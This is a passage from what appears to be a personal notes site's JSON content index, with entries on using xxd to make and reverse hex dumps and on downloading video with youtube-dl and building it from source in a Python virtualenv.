Create a hex dump of binary file $BINARY.\n#\nxxd $BINARY $HEXDUMP\n \n# Reconstitute a binary file from a hex dump! Wow!\n#\nxxd -r $HEXDUMP $BINARY ","richContent":"&lt;p&gt;The xxd command is actually pretty standard on Linux systems.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create a hex dump of binary file $BINARY.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xxd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BINARY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HEXDUMP&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Reconstitute a binary file from a hex dump! Wow!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xxd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HEXDUMP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BINARY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/youtube-dl":{"slug":"spells/youtube-dl","filePath":"spells/youtube-dl.md","title":"youtube-dl","links":["spells/ffmpeg"],"tags":["Application/youtube-dl","Application/ffmpeg","Language/Python","Standard/HD"],"content":"You can download video and audio files for offline viewing from a variety of websites using youtube-dl. Be sure to install ffmpeg as well for tagging.\n# Grab an HD MP4 (720p or the next best LARGER size).\n#\nyoutube-dl \\\n\t--output &quot;%(title)s (%(id)s).%(ext)s&quot; \\\n\t--format &quot;bestvideo[width&lt;=1280][height&gt;540][ext=mp4]+bestaudio[ext=m4a]/bestvideo[width&lt;=1920][height&gt;720][ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&quot; \\\n\t--add-metadata &quot;$URL&quot;\n \n# Grab the best quality video and audio. Will often get muxed into an MKV\n# container rather than MP4, though sometimes you&#039;ll get something like\n# WEBM.\n#\nyoutube-dl \\\n\t--output &quot;%(title)s (%(id)s).%(ext)s&quot; \\\n\t--format &quot;bestvideo+bestaudio&quot; \\\n\t--add-metadata &quot;$URL&quot;\n \n# Grab the best single format file less than 200 MB.\n#\nyoutube-dl \\\n\t--output &quot;%(title)s (%(id)s).%(ext)s&quot; \\\n\t--format &quot;best[filesize&lt;200M]&quot; \\\n\t--add-metadata &quot;$URL&quot;\nUseful size specs:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNameWidth(Max) HeightNotes480p854480DVD quality540p960540“Quarter HD”, pretty uncommon (except on VHX)720p1280720Often just called “HD”1080p19201080Often called “Full HD”\nMost of the time, you’ll need a newer version of youtube-dl than is available in your distro’s repos… Or that can be installed using pip. The easiest way to get do this is to install youtube-dl at the system level (to make sure that all the dependencies are present), and then to grab the latest youtube-dl source code from GitHub and build it in a Python virtual environment.\nvirtualenv youtube-dl\ncd youtube-dl\n. bin/activate\n \n# Run `pip install youtube-dl` here if you DON&#039;T have the package\n# installed at the system level. This will pull in all necessary deps\n \ngit clone github.com/ytdl-org/youtube-dl.git\ncd youtube-dl\nmake\n \n# DO NO `make install` however! Instead, just run using ./youtube-dl.","richContent":"&lt;p&gt;You can download video and audio files for offline viewing from a variety of websites using &lt;a href=&quot;https://github.com/ytdl-org/youtube-dl&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;youtube-dl&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Be sure to install &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ffmpeg&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ffmpeg&quot;&gt;ffmpeg&lt;/a&gt; as well for tagging.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Grab an HD MP4 (720p or the next best LARGER size).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;youtube-dl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%(title)s (%(id)s).%(ext)s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;bestvideo[width&amp;#x3C;=1280][height&gt;540][ext=mp4]+bestaudio[ext=m4a]/bestvideo[width&amp;#x3C;=1920][height&gt;720][ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--add-metadata&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Grab the best quality video and audio. Will often get muxed into an MKV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# container rather than MP4, though sometimes you&#039;ll get something like&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# WEBM.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;youtube-dl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%(title)s (%(id)s).%(ext)s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;bestvideo+bestaudio&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--add-metadata&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Grab the best single format file less than 200 MB.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;youtube-dl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%(title)s (%(id)s).%(ext)s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--format&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;best[filesize&amp;#x3C;200M]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--add-metadata&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Useful size specs:&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;Name&lt;/th&gt;&lt;th align=&quot;right&quot;&gt;Width&lt;/th&gt;&lt;th align=&quot;right&quot;&gt;(Max) Height&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Notes&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;480p&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;854&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;480&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;DVD quality&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;540p&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;960&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;540&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;“Quarter HD”, pretty uncommon (except on VHX)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;720p&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1280&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;720&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Often just called “HD”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;1080p&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1920&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1080&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Often called “Full HD”&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;Most of the time, you’ll need a newer version of youtube-dl than is available in your distro’s repos… Or that can be installed using pip. The easiest way to get do this is to install youtube-dl at the system level (to make sure that all the dependencies are present), and then to grab the latest youtube-dl source code from GitHub and build it in a &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/common-python-tools-using-virtualenv-installing-with-pip-and-managing-packages&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Python virtual environment&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;virtualenv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; youtube-dl&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; youtube-dl&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bin/activate&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Run `pip install youtube-dl` here if you DON&#039;T have the package&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# installed at the system level. This will pull in all necessary deps&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; clone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; https://github.com/ytdl-org/youtube-dl.git&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; youtube-dl&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;make&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# DO NO `make install` however! Instead, just run using ./youtube-dl.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"}}